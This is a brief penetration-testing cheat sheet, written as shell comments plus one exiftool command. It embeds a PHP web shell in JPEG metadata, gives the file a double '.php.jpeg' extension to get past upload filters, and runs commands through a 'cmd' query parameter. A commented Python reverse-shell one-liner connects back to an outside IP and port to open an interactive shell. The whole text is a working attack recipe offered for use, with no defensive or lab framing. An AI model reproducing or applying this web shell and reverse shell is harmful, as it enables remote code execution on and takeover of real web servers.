#On kali$ apt-get install exiftool
#Change image filename to include .php before image extension: image.php.jpeg (works with png etc etc)
#Upload, execute image location adding ?cmd=command-here example: www.site.com/image.php.jpeg?cmd=ls
#To acheive terminal shell, execute rev shell python from pentest monkey etc etc.
#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

exiftool -DocumentName="<h1>F1uffyGoat<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpeg
